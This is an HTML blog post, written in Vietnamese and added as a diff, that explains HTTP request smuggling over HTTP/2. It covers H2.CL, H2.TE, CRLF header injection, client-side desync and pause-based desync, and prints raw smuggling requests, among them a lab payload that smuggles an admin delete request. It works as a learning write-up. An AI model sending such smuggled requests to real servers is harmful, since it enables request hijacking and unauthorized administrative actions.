@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="canonical" href="https://rayinaw.github.io/2022/11/02/http-request-smuggling-http-2.0/">
+  <link rel="icon" href="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <title>HTTP request smuggling với HTTP/2.0 | Rayinaw</title>
+  <meta name="author" content="Rayinaw">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index,follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="format-detection" content="telphone=no, email=no">
+  
+    <meta name="keywords" content="HRS">
+  
+  <meta name="description" content="Lời nói đầu:Bài viết trước mình đã nói về khái niệm cơ bản của HRS và một số dạng cơ bản với HTTP&#x2F;1.1. Bài viết này mình sẽ đi vào HRS với HTTP&#x2F;2.0, nó khá phức tạp hơn so với HTTP&#x2F;1.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP request smuggling với HTTP&#x2F;2.0">
+<meta property="og:url" content="https://rayinaw.github.io/2022/11/02/http-request-smuggling-HTTP-2.0/index.html">
+<meta property="og:site_name" content="Rayinaw">
+<meta property="og:description" content="Lời nói đầu:Bài viết trước mình đã nói về khái niệm cơ bản của HRS và một số dạng cơ bản với HTTP&#x2F;1.1. Bài viết này mình sẽ đi vào HRS với HTTP&#x2F;2.0, nó khá phức tạp hơn so với HTTP&#x2F;1.1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+<meta property="article:published_time" content="2022-11-02T16:23:23.000Z">
+<meta property="article:modified_time" content="2024-09-05T07:14:37.730Z">
+<meta property="article:author" content="Rayinaw">
+<meta property="article:tag" content="HRS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <!-- 站点验证相关 -->
+  
+    
+      <meta name="google-site-verification" content="aI3yWWy1IiiYpszN7ZglYDMHV2_A2mRNPujhnK6q8uA">
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all">
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)">
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night.min.css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all">
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/rss2.xml" title="Rayinaw" type="application/rss+xml">
+</head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                                
+                                                    
+                                                        
+                                                                <li>
+                                                                    <a href="/">
+                                                                        <i class="fa fa-home"></i>Trang chủ
+                                                                    </a>
+                                                                </li>
+                                                                
+                                                                    
+                                                        
+                                                                <li>
+                                                                    <a href="/archives/">
+                                                                        <i class="fa fa-book"></i>Kho lưu trữ
+                                                                    </a>
+                                                                </li>
+                                                                
+                                                                    
+                                                        
+                                                                <li>
+                                                                    <a href="/about/">
+                                                                        <i class="fa fa-paper-plane"></i>Về mình
+                                                                    </a>
+                                                                </li>
+                                                                
+                                                                    
+                                                                        
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo">
+                        <a href="/">
+                            Rayinaw
+                        </a>
+                    </div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>
+                            Rayinaw
+                        </h2> <br>
+                        <span>Nơi mình ghi chú lại những thứ đã học.</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="https://rayinaw.github.io/2022/11/02/http-request-smuggling-HTTP-2.0/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">HTTP request smuggling với HTTP/2.0</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2022-11-02T16:23:23.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2022-11-02</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> Tác giả <span itemprop="name">Rayinaw</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~4.69K
+                    
+                    từ
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>Bài viết này được chỉnh sửa lần cuối vào <time datetime="1725520477730"></time> trước, và có thể cần cập nhật。</p></div>
+            </div>
+            
+            
+            
+                <div class="kratos-post-inner-toc toc-div-class">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Loi-noi-dau"><span class="toc-number">1.</span> <span class="toc-text">Lời nói đầu:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-request-smuggling-voi-HTTP-x2F-2-0"><span class="toc-number">1.1.</span> <span class="toc-text">HTTP request smuggling với HTTP&#x2F;2.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-x2F-2-downgrading"><span class="toc-number">1.1.1.</span> <span class="toc-text">HTTP&#x2F;2 downgrading</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#H2-CL-Desync"><span class="toc-number">1.1.2.</span> <span class="toc-text">H2.CL Desync:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#H2-TE"><span class="toc-number">1.1.3.</span> <span class="toc-text">H2.TE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#H2-TE-Desync-May-chu-Front-end-downgrade-H2-thanh-H1-va-khong-xem-xet-loai-bo-cac-truong-lien-quan-den-connection-specific-header-fields"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">H2.TE Desync - Máy chủ Front-end downgrade H2 thành H1 và không xem xét loại bỏ các trường liên quan đến connection-specific header fields</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#H2-TE-via-Request-Header-Injection"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">H2.TE via Request Header Injection</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-request-tunnelling"><span class="toc-number">1.1.4.</span> <span class="toc-text">HTTP request tunnelling</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-side-Desync"><span class="toc-number">1.2.</span> <span class="toc-text">Client-side Desync</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pause-based-desync"><span class="toc-number">1.3.</span> <span class="toc-text">Pause-based desync</span></a></li></ol></li></ol>
+                </div>
+            
+            <hr>
+            <div itemprop="articleBody"><h1 id="Loi-noi-dau"><a href="#Loi-noi-dau" class="headerlink" title="Lời nói đầu:"></a>Lời nói đầu:</h1><p>Bài viết trước mình đã nói về khái niệm cơ bản của HRS và một số dạng cơ bản với HTTP&#x2F;1.1. Bài viết này mình sẽ đi vào HRS với HTTP&#x2F;2.0, nó khá phức tạp hơn so với HTTP&#x2F;1.1 tuy nhiên cũng không khó lắm đâu ^^. Cùng đi vào bài nhé~</p>
+<h2 id="HTTP-request-smuggling-voi-HTTP-x2F-2-0"><a href="#HTTP-request-smuggling-voi-HTTP-x2F-2-0" class="headerlink" title="HTTP request smuggling với HTTP&#x2F;2.0"></a>HTTP request smuggling với HTTP&#x2F;2.0</h2><p>Tham khảo: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://portswigger.net/research/http2">https://portswigger.net/research/http2</a></p>
+<h3 id="HTTP-x2F-2-downgrading"><a href="#HTTP-x2F-2-downgrading" class="headerlink" title="HTTP&#x2F;2 downgrading"></a>HTTP&#x2F;2 downgrading</h3><p>Nguồn gốc chính của lỗ hỏng này là front-end server  sử dụng giao thức HTTP&#x2F;2 để giao tiếp với máy khách trong khi đó nó lại dùng HTTP&#x2F;1.1 để giao tiếp với back-end server.</p>
+<p><img src="https://github.com/user-attachments/assets/d05ea5a2-99a9-434d-8177-0be932babaf5" alt="image"></p>
+<p>Khi đó user có thể chèn thêm các phần độc hại vào header mà hợp lệ với HTTP&#x2F;2, tuy nhiên nó lại được phân tích ở máy chủ back-end với giao thức HTTP&#x2F;1.1, khi đó lỗi HRS sẽ xảy ra.</p>
+<p>Front-end HTTP&#x2F;2 server thường sử dụng message length có sẵn trong các data frames gửi đi theo giao thức này. Trong khi để Backend hiểu được thì cần downgrade xuống HTTP&#x2F;1 bao gồm 2 loại là TE và CL dẫn đến lỗi H2-TE và H2-CL.</p>
+<h3 id="H2-CL-Desync"><a href="#H2-CL-Desync" class="headerlink" title="H2.CL Desync:"></a>H2.CL Desync:</h3><p>Theo <a target="_blank" rel="external nofollow noopener noreferrer" href="https://datatracker.ietf.org/doc/html/rfc7540">HTTP&#x2F;2 RFC</a>, ta có độ dài ở trong mỗi frame do đó tiêu đề Content-length là không cần thiết, tuy nhiên vẫn có thể đặt Content-length trong header.</p>
+<p>Khi user gửi request đến front-end server có chứa trường <code>Content-Length</code>, front-end server có thể sẽ chấp nhận trường này dù độ dài không đúng. Sau đó nó sẽ hạ cấp request từ HTTP&#x2F;2.0 xuống HTTP&#x2F;1.1 và giữ nguyên trường <code>Content-Length</code>, tại back-end server nó có phân tích trường <code>Content-Length</code> với giá trị mà user cho vào, bây giờ user có thể chèn thêm các phần độc hại và một giá trị <code>Content-Length</code> không phù hợp với server để trigger HRS.</p>
+<p>Ví dụ:</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:method POST</span><br><span class="line">:path /</span><br><span class="line">:authority example.com</span><br><span class="line">content-length <span class="number">4</span></span><br><span class="line">aaaaGET /abc HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Foo: Bar</span><br></pre></td></tr></table></figure>
+<p>Sau khi hạ cấp nó sẽ tạo thành yêu cầu như sau:</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Content-Length: <span class="number">4</span></span><br><span class="line"></span><br><span class="line">aaaaGET /abc HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Foo: Bar</span><br></pre></td></tr></table></figure>
+
+<p>Sau khi front-end server gửi yêu cầu đến back-end server phần còn lại sẽ được xem như là của yêu cầu mới, khi một người dùng khác gửi yêu cầu đến cùng thời điểm, phần còn lại sẽ được gắn vào đầu của yêu cầu mới và lỗi HRS được kích hoạt.</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Content-Length: <span class="number">4</span></span><br><span class="line"></span><br><span class="line">aaaa</span><br></pre></td></tr></table></figure>
+<p>Trả về <code>200 OK</code><br>Yêu cầu của nạn nhân sẽ trở thành yêu cầu sau:</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /abc HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Foo: BarGET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure>
+<p>Trả về <code>404 Not Found</code></p>
+<h3 id="H2-TE"><a href="#H2-TE" class="headerlink" title="H2.TE"></a>H2.TE</h3><h4 id="H2-TE-Desync-May-chu-Front-end-downgrade-H2-thanh-H1-va-khong-xem-xet-loai-bo-cac-truong-lien-quan-den-connection-specific-header-fields"><a href="#H2-TE-Desync-May-chu-Front-end-downgrade-H2-thanh-H1-va-khong-xem-xet-loai-bo-cac-truong-lien-quan-den-connection-specific-header-fields" class="headerlink" title="H2.TE Desync - Máy chủ Front-end downgrade H2 thành H1 và không xem xét loại bỏ các trường liên quan đến connection-specific header fields"></a>H2.TE Desync - Máy chủ Front-end downgrade H2 thành H1 và không xem xét loại bỏ các trường liên quan đến <code>connection-specific header fields</code></h4><p>Request gửi đến FE server:</p>
+<table>
+<thead>
+<tr>
+<th>:method</th>
+<th>POST</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>:path</td>
+<td>&#x2F;identitfy&#x2F;XUI</td>
+</tr>
+<tr>
+<td>:authority</td>
+<td>id.b2b.oath.com</td>
+</tr>
+<tr>
+<td>transfer-encoding</td>
+<td>chunked</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /oops HTTP/1.1</span><br><span class="line">Host: psres.net</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+
+<p>FE downgrade mà không tuân thủ việc loại bỏ transfer-encoding:</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /identity/XUI HTTP/<span class="number">1.1</span></span><br><span class="line">Host: id.b2b.oath.com</span><br><span class="line">Content-Length: <span class="number">66</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line">GET /oops HTTP/<span class="number">1.1</span></span><br><span class="line">Host: psres.net</span><br><span class="line">Content-Length: <span class="number">10</span></span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+
+<p>Phía server chọn transfer encoding và H2.TE xảy ra, tương tự như CL.TE.</p>
+<p>Bây giờ request sẽ trở thành:</p>
+<ul>
+<li>Request 1<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /identity/XUI HTTP/<span class="number">1.1</span></span><br><span class="line">Host: id.b2b.oath.com</span><br><span class="line">Content-Length: <span class="number">66</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></li>
+<li>Request 2<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /oops HTTP/<span class="number">1.1</span></span><br><span class="line">Host: psres.net</span><br><span class="line">Content-Length: <span class="number">10</span></span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="H2-TE-via-Request-Header-Injection"><a href="#H2-TE-via-Request-Header-Injection" class="headerlink" title="H2.TE via Request Header Injection"></a>H2.TE via Request Header Injection</h4><p>Request gửi đến FE server:</p>
+<table>
+<thead>
+<tr>
+<th>:method</th>
+<th>POST</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>:path</td>
+<td>&#x2F;</td>
+</tr>
+<tr>
+<td>:authority</td>
+<td>start.mozilla.org</td>
+</tr>
+<tr>
+<td>foo</td>
+<td>b<code>\r\n</code> <br>    transfer-encoding: chunked</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: evil-netlify-domain\r\n</span><br><span class="line">Content-Length: 5\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+
+<p>Sau khi FE downgrade, <code>\r\n</code> trigger header injection:</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: start.mozilla.org\r\n</span><br><span class="line">Foo: b\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Content-Length: <span class="number">71</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: evil-netlify-domain\r\n</span><br><span class="line">Content-Length: <span class="number">5</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+
+<p>Bây giờ bài toán lại trở về H2.TE</p>
+<h3 id="HTTP-request-tunnelling"><a href="#HTTP-request-tunnelling" class="headerlink" title="HTTP request tunnelling"></a>HTTP request tunnelling</h3><h2 id="Client-side-Desync"><a href="#Client-side-Desync" class="headerlink" title="Client-side Desync"></a>Client-side Desync</h2><p>Tham khảo: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.youtube.com/watch?v=KN8WF1q04no">https://www.youtube.com/watch?v=KN8WF1q04no</a></p>
+<p>Đôi khi server sẽ trả về 2 response với cùng một request nếu Connection là keep-alive và gửi chung 2 request trong 1 request.</p>
+<p><img src="https://github.com/user-attachments/assets/1634bf00-b4b5-4eb8-a166-3e9e37a3de49" alt="image"></p>
+<p>Để server phân biệt được khi nào 2 request, khi nào thì chỉ là 1 request và phần sau là phần body thì ta cần thêm giá trị content-length.</p>
+<p>Tuy nhiên một vài server sẽ không mong đợi Content-Length và sẽ mặc định là 0. Khi này server sẽ nghĩ đó là 2 request dù đó là POST request như sau:</p>
+<p><img src="https://github.com/user-attachments/assets/ef9acd68-59fe-4261-8f78-00fe72eb3e73" alt="image"></p>
+<p>Và 2 response sẽ được trả về.</p>
+<h2 id="Pause-based-desync"><a href="#Pause-based-desync" class="headerlink" title="Pause-based desync"></a>Pause-based desync</h2><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /resources HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>a09000d030187f382ab5b5f001b002c.web-security-academy.net</span><br><span class="line">Cookie: session=WPmZElZUBulQFtkztzMyvYUcW7cnDwxz</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">159</span></span><br><span class="line"></span><br><span class="line">POST /admin/delete/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: <span class="number">53</span></span><br><span class="line">Content-Type: x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">csrf=B2qufiNeJo9Hsq32pJFLGOZio9bCgkyn&amp;username=carlos</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/user-attachments/assets/ab8e2472-1f0b-48ee-a3b3-3e9945e7c426" alt="image"><br><img src="https://github.com/user-attachments/assets/85e09525-6d92-4bb9-89ba-3e1699635fc1" alt="image"></p>
+</div>
+        </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> Chia sẻ</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://rayinaw.github.io/2022/11/02/http-request-smuggling-HTTP-2.0/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://rayinaw.github.io/2022/11/02/http-request-smuggling-HTTP-2.0/";
+            const title         = "「HTTP request smuggling với HTTP/2.0」";
+            const excerpt       = `Lời nói đầu:Bài viết trước mình đã nói về khái niệm cơ bản của HRS và một số dạng cơ bản với HTTP&#x2F;1.1. Bài viết ...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/HRS/" rel="tag">HRS</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2024-09-05T07:14:37.730Z" itemprop="dateModified">Lần chỉnh sửa cuối cùng：2024-09-05</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" Java Reflection" href="/2022/11/02/Java-reflection/">Bài đăng mới hơn &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" loading="lazy" decoding="auto">
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">来年の事を言えば鬼が笑う</p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                Bài đăng
+            </span>
+            <span class="count">
+                15
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                Thể loại
+            </span>
+            <span class="count">
+                11
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                Thẻ
+            </span>
+            <span class="count">
+                12
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix toc-div-class">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        Thư mục bài viết
+        <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Loi-noi-dau"><span class="toc-text">Lời nói đầu:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-request-smuggling-voi-HTTP-x2F-2-0"><span class="toc-text">HTTP request smuggling với HTTP&#x2F;2.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-x2F-2-downgrading"><span class="toc-text">HTTP&#x2F;2 downgrading</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#H2-CL-Desync"><span class="toc-text">H2.CL Desync:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#H2-TE"><span class="toc-text">H2.TE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#H2-TE-Desync-May-chu-Front-end-downgrade-H2-thanh-H1-va-khong-xem-xet-loai-bo-cac-truong-lien-quan-den-connection-specific-header-fields"><span class="toc-text">H2.TE Desync - Máy chủ Front-end downgrade H2 thành H1 và không xem xét loại bỏ các trường liên quan đến connection-specific header fields</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#H2-TE-via-Request-Header-Injection"><span class="toc-text">H2.TE via Request Header Injection</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-request-tunnelling"><span class="toc-text">HTTP request tunnelling</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-side-Desync"><span class="toc-text">Client-side Desync</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pause-based-desync"><span class="toc-text">Pause-based desync</span></a></li></ol></li></ol>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>Thể loại</h4>
